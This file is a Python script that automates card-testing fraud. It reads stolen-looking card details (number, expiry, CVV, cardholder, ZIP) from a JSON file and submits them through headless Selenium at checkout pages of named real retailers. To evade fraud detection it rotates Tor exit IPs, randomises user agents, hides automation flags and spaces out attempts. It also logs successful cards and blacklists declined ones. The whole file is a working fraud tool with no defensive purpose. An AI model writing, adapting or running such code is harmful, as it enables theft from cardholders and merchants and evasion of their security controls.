import subprocess
import time
import random
import json
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

HIGH_VALUE_MERCHANTS = [
    {"name": "Newegg", "url": "https://secure.newegg.com/Shopping/ShoppingCart.aspx"},
    {"name": "DHGate", "url": "https://cart.dhgate.com/cart"},
    {"name": "AliExpress", "url": "https://shoppingcart.aliexpress.com/shopcart/"}
]

LOW_SECURITY_MERCHANTS = [
    {"name": "Wish", "url": "https://www.wish.com/cart"},
    {"name": "Udemy", "url": "https://www.udemy.com/cart/checkout/"}
]

USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36"
]

BLACKLIST_FILE = "blacklist.json"
CAMPAIGNS_FILE = "card_campaigns.json"

def load_cards():
    with open("amex_cards.json", "r") as f:
        return json.load(f)

def load_campaigns():
    with open(CAMPAIGNS_FILE, "r") as f:
        return json.load(f)

def load_blacklist():
    if not os.path.exists(BLACKLIST_FILE):
        return {}
    with open(BLACKLIST_FILE, "r") as f:
        return json.load(f)

def save_blacklist(blacklist):
    with open(BLACKLIST_FILE, "w") as f:
        json.dump(blacklist, f, indent=2)

def rotate_tor_ip():
    subprocess.run(["docker", "restart", "tor-proxy"])
    time.sleep(5)

def setup_browser(user_agent):
    options = Options()
    options.add_argument("--incognito")
    options.add_argument(f"user-agent={user_agent}")
    options.add_argument("--proxy-server=socks5://127.0.0.1:9050")
    options.add_argument("--headless")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("window-size=1920,1080")
    return webdriver.Chrome(options=options)

def attempt_checkout(card, merchant):
    user_agent = random.choice(USER_AGENTS)
    browser = setup_browser(user_agent)
    try:
        browser.get(merchant["url"])
        time.sleep(5)

        try:
            browser.find_element(By.NAME, "cardnumber").send_keys(card["pan"])
            browser.find_element(By.NAME, "exp-date").send_keys(card["expiry"])
            browser.find_element(By.NAME, "cvc").send_keys(card["cvv"])
            browser.find_element(By.NAME, "cardholder-name").send_keys(card["cardholder"])
            browser.find_element(By.NAME, "postal").send_keys(card["address"]["zip"])
            time.sleep(1)
            browser.find_element(By.TAG_NAME, "form").submit()
        except Exception:
            pass

        time.sleep(5)

        page_text = browser.page_source.lower()
        if "thank you" in page_text or "order confirmed" in page_text:
            result = "SUCCESS"
        elif "pending" in page_text:
            result = "PENDING"
        else:
            result = "DECLINED"

    except Exception as e:
        result = f"ERROR: {e}"

    finally:
        browser.quit()
        return result

def log_attempt(card, merchant, result):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    with open("intelligent_checkout_log.txt", "a") as f:
        f.write(f"{timestamp} | {merchant['name']} | {card['pan']} | {result}\n")

def main():
    cards = load_cards()
    campaigns = load_campaigns()
    blacklist = load_blacklist()

    # Map PAN -> full card info
    card_dict = {card["pan"]: card for card in cards}

    failure_tracker = {}

    while True:
        group_choice = random.choices(
            ["Group_A_Strong", "Group_B_PendingOnly", "Group_C_New"],
            weights=[0.6, 0.3, 0.1],
            k=1
        )[0]

        card_pool = campaigns.get(group_choice, [])
        if not card_pool:
            continue

        pan = random.choice(card_pool)
        if pan in blacklist:
            continue

        card = card_dict.get(pan)
        if not card:
            continue

        merchant = random.choice(
            HIGH_VALUE_MERCHANTS if group_choice == "Group_A_Strong" else LOW_SECURITY_MERCHANTS
        )

        rotate_tor_ip()
        result = attempt_checkout(card, merchant)
        log_attempt(card, merchant, result)

        print(f"Attempted {merchant['name']} with card ending {pan[-4:]} — {result}")

        if "DECLINED" in result or "ERROR" in result:
            failure_tracker[pan] = failure_tracker.get(pan, 0) + 1
            if failure_tracker[pan] >= 3:
                print(f"🚫 Blacklisting card ending {pan[-4:]} due to multiple failures.")
                blacklist[pan] = {"blacklisted_at": time.strftime("%Y-%m-%d %H:%M:%S")}
                save_blacklist(blacklist)

        wait_time = random.randint(45, 120)
        print(f"Waiting {wait_time} seconds before next attempt...")
        time.sleep(wait_time)

if __name__ == "__main__":
    main()
